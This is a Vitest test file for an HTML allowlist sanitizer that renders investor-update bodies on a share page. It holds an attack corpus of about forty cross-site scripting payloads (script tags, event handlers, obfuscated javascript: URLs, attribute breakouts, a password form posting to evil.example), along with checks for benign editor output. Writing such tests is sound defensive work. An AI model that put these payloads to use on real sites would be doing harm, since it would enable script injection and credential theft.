import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { sanitizeUpdateHtml, safeUpdateImageSrc } from "@/lib/update-html";
import { rewriteDocumentUrls } from "@/lib/share-docs";

// Part 40 (WS130, F125): update bodies are rendered through this allowlist on the public share page
// and the update page. The first block is the attack corpus; the second is what the update editor
// really produces, which must come through unchanged (no UX regression for honest content).

const TAG_NAMES = new Set(["p", "br", "strong", "b", "em", "i", "u", "s", "strike", "code", "pre", "blockquote", "h1", "h2", "h3", "h4", "ul", "ol", "li", "hr", "a", "img", "span", "div", "table", "thead", "tbody", "tr", "th", "td"]);
const ATTRS: Record<string, string[]> = {
  a: ["href", "target", "rel", "class"],
  img: ["src", "alt", "title", "class"],
  ol: ["start"],
  span: ["data-portco", "class", "style"],
  th: ["style"], td: ["style"],
};
const STYLED = ["p", "h1", "h2", "h3", "h4", "div", "li"];
/** Every real tag in the output is allowlisted, carries only allowed attributes, and has safe URLs. */
function expectSafe(html: string) {
  expect(html).not.toMatch(/<(script|iframe|object|embed|style|svg|math|form|input|link|meta|base)\b/i);
  for (const tag of html.match(/<\/?[a-zA-Z][^>]*>/g) ?? []) {
    const name = /^<\/?([a-zA-Z0-9]+)/.exec(tag)![1].toLowerCase();
    expect(TAG_NAMES.has(name), tag).toBe(true);
    for (const am of tag.matchAll(/\s([a-zA-Z-]+)\s*=\s*"([^"]*)"/g)) {
      const allowed = [...(ATTRS[name] ?? []), ...(STYLED.includes(name) ? ["style"] : [])];
      expect(allowed, tag).toContain(am[1].toLowerCase());
      if (am[1].toLowerCase() === "href") expect(am[2], tag).toMatch(/^(https?:\/\/|mailto:)/i);
      if (am[1].toLowerCase() === "src") expect(am[2], tag).toMatch(/^(https?:\/\/|\/api\/documents\/[\w-]+\/view$|\/api\/share\/[\w%-]+\/doc\/[\w-]+$)/);
      if (am[1].toLowerCase() === "style") expect(am[2], tag).toMatch(/^(text-align: (left|right|center|justify)|margin-left: [\d.]+(px|em|rem))(; (text-align: (left|right|center|justify)|margin-left: [\d.]+(px|em|rem)))*$/);
    }
    expect(tag.replace(/\s[a-zA-Z-]+\s*=\s*"[^"]*"/g, ""), tag).toMatch(/^<\/?[a-zA-Z0-9]+\s*\/?>$/);
  }
}

const CORPUS: [string, string][] = [
  ["script", "<p>hi</p><script>alert(document.cookie)</script>"],
  ["script src", '<script src="https://evil.example/x.js"></script>'],
  ["script uppercase", "<SCRIPT>alert(1)</SCRIPT>"],
  ["script unterminated", "<script>alert(1)"],
  ["img onerror", "<img src=x onerror=alert(1)>"],
  ["img onerror quoted with valid src", '<img src="https://example.com/a.png" onerror="alert(1)" onload="alert(2)">'],
  ["img javascript src", '<img src="javascript:alert(1)">'],
  ["img data src", '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">'],
  ["img relative evil src", '<img src="/api/documents/x/../../admin/view">'],
  ["img protocol relative", '<img src="//evil.example/x.png">'],
  ["a javascript", '<a href="javascript:alert(1)">x</a>'],
  ["a javascript entity", '<a href="&#106;avascript:alert(1)">x</a>'],
  ["a javascript hex entity", '<a href="&#x6A;avascript:alert(1)">x</a>'],
  ["a javascript tab", '<a href="java\tscript:alert(1)">x</a>'],
  ["a javascript newline entity", '<a href="jav&#10;ascript:alert(1)">x</a>'],
  ["a data", '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
  ["a vbscript", '<a href="vbscript:msgbox(1)">x</a>'],
  ["a onclick", '<a href="https://example.com" onclick="alert(1)" onmouseover="alert(2)">x</a>'],
  ["a attribute breakout", '<a href="https://example.com/&quot; onmouseover=&quot;alert(1)">x</a>'],
  ["iframe", '<iframe src="https://evil.example"></iframe>'],
  ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
  ["object / embed", '<object data="x.swf"></object><embed src="x.swf">'],
  ["svg onload", "<svg onload=alert(1)><circle/></svg>"],
  ["math", '<math><mi xlink:href="javascript:alert(1)">x</mi></math>'],
  ["style element", "<style>body{background:url(javascript:alert(1))}</style>"],
  ["style attribute expression", '<p style="background:url(javascript:alert(1));color:red">x</p>'],
  ["style attribute breakout", '<p style="text-align:center" onclick="alert(1)">x</p>'],
  ["div onmouseover", '<div onmouseover="alert(1)">x</div>'],
  ["form", '<form action="https://evil.example"><input name="password"><button>go</button></form>'],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">'],
  ["base", '<base href="https://evil.example/">'],
  ["link stylesheet", '<link rel="stylesheet" href="https://evil.example/x.css">'],
  ["html comment", "<!--><script>alert(1)</script>-->"],
  ["unterminated tag", '<img src="https://example.com/a.png" onerror=alert(1)'],
  ["nested", "<p><a href=\"javascript:alert(1)\"><img src=x onerror=alert(1)></a></p>"],
  ["class injection", '<span class="portco-mention evil" onclick="alert(1)">x</span>'],
  ["data-portco injection", '<span data-portco="x&quot; onclick=&quot;alert(1)">x</span>'],
  ["ol start injection", '<ol start="1 onclick=alert(1)"><li>x</li></ol>'],
  ["td style injection", '<td style="text-align:left;background:url(javascript:alert(1))">x</td>'],
];

describe("sanitizeUpdateHtml: attack corpus", () => {
  for (const [name, src] of CORPUS) {
    it(name, () => {
      const out = sanitizeUpdateHtml(src);
      expectSafe(out);
      expect(sanitizeUpdateHtml(out)).toBe(out); // idempotent
    });
  }

  it("drops script, style and iframe with their content; keeps the surrounding text", () => {
    expect(sanitizeUpdateHtml("<p>a</p><script>alert(1)</script><style>x{}</style><iframe src=x>inner</iframe><p>b</p>")).toBe("<p>a</p><p>b</p>");
  });
  it("shows unknown markup as text, never as markup", () => {
    expect(sanitizeUpdateHtml("<blink>hi</blink> 1 < 2")).toBe("hi 1 &lt; 2");
    expect(sanitizeUpdateHtml("<img src=x onerror=alert(1)")).toBe("&lt;img src=x onerror=alert(1)");
  });
  it("drops a dangerous anchor but keeps its text and balances the tags", () => {
    expect(sanitizeUpdateHtml('<p><a href="javascript:alert(1)">click</a> now</p>')).toBe("<p>click now</p>");
    expect(sanitizeUpdateHtml('<a href="https://example.com">open')).toBe('<a href="https://example.com" target="_blank" rel="noopener noreferrer">open</a>');
  });
  it("tolerates non-string input", () => {
    expect(sanitizeUpdateHtml(undefined as unknown as string)).toBe("");
    expect(sanitizeUpdateHtml("")).toBe("");
  });
});

describe("sanitizeUpdateHtml: what the update editor produces comes through unchanged", () => {
  const SAME = [
    "<p>Plain paragraph with <strong>bold</strong>, <em>italic</em>, <u>underline</u>, <s>strike</s> and <code>code</code>.</p>",
    "<h2>Heading two</h2><h3>Heading three</h3>",
    "<ul><li><p>one</p></li><li><p>two</p></li></ul>",
    "<ol><li><p>one</p></li></ol>",
    '<ol start="3"><li><p>three</p></li></ol>',
    "<blockquote><p>quote</p></blockquote>",
    "<pre><code>const x = 1;</code></pre>",
    "<hr>",
    "<p>line one<br>line two</p>",
    '<p style="text-align: center">centered</p>',
    '<h2 style="text-align: right">right</h2>',
    '<p style="margin-left: 4rem">indented</p>',
    '<p style="text-align: center; margin-left: 2rem">both</p>',
    '<a href="https://example.com/page?a=1&amp;b=2" target="_blank" rel="noopener noreferrer" class="text-primary underline">link</a>',
    '<a href="mailto:jane@example.com" target="_blank" rel="noopener noreferrer">mail</a>',
    '<img src="https://example.com/chart.png" alt="Chart" class="max-w-full rounded-md my-4">',
    '<img src="/api/documents/ckabc123/view" alt="" class="max-w-full rounded-md my-4">',
    '<img src="/api/share/abc123%2Ftok/doc/ckabc123" alt="Screenshot" title="Q3" class="max-w-full rounded-md my-4">',
    '<span data-portco="ckabc123" class="portco-mention">Acme</span>',
    "<table><thead><tr><th>Metric</th><th>Value</th></tr></thead><tbody><tr><td>MRR</td><td>$10k</td></tr></tbody></table>",
  ];
  for (const html of SAME) {
    it(html.slice(0, 70), () => {
      expect(sanitizeUpdateHtml(html)).toBe(html);
    });
  }

  it("normalises the editor's link attribute order and a stored link without target/rel", () => {
    expect(sanitizeUpdateHtml('<a class="text-primary underline" target="_blank" href="https://example.com" rel="noopener noreferrer nofollow">x</a>')).toBe(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer" class="text-primary underline">x</a>'
    );
  });

  it("keeps in-app image URLs, including after the share route rewrites them", () => {
    const body = '<p><img src="/api/documents/ckabc123/view" alt=""></p>';
    const rewritten = rewriteDocumentUrls(body, "tok/en");
    expect(rewritten).toContain("/api/share/tok%2Fen/doc/ckabc123");
    expect(sanitizeUpdateHtml(rewritten)).toContain('src="/api/share/tok%2Fen/doc/ckabc123"');
    expect(safeUpdateImageSrc("/api/documents/a-b_c/view")).toBe("/api/documents/a-b_c/view");
    for (const bad of ["/api/documents/a/view/../x", "/api/documents/a/b", "/admin", "//evil.example/x.png", "javascript:alert(1)", "data:image/png;base64,AAAA", "ftp://example.com/x.png"]) {
      expect(safeUpdateImageSrc(bad), bad).toBeNull();
    }
  });

  it("drops classes the editor never sets, but keeps its own", () => {
    expect(sanitizeUpdateHtml('<img src="https://example.com/a.png" alt="" class="max-w-full evil-class fixed inset-0">')).toBe('<img src="https://example.com/a.png" alt="" class="max-w-full">');
  });
});

describe("the render sites use it", () => {
  const read = (p: string) => readFileSync(p, "utf8");
  it("the public share page and the update page sanitize update.body before rendering it", () => {
    for (const f of ["src/app/share/[token]/page.tsx", "src/app/updates/[id]/page.tsx"]) {
      const src = read(f);
      expect(src, f).toContain("sanitizeUpdateHtml(update.body)");
      expect(src, f).not.toMatch(/__html:\s*update\.body/);
    }
  });
  it("no page renders update.body raw anywhere under src/app", () => {
    // allowed: the editor's own value / onChange plumbing; never dangerouslySetInnerHTML with a bare update body
    const files = ["src/app/share/[token]/page.tsx", "src/app/updates/[id]/page.tsx", "src/app/updates/page.tsx", "src/app/admin/updates/page.tsx"];
    for (const f of files) expect(read(f), f).not.toMatch(/__html:\s*(update|u)\.body\b(?!\))/);
  });
});
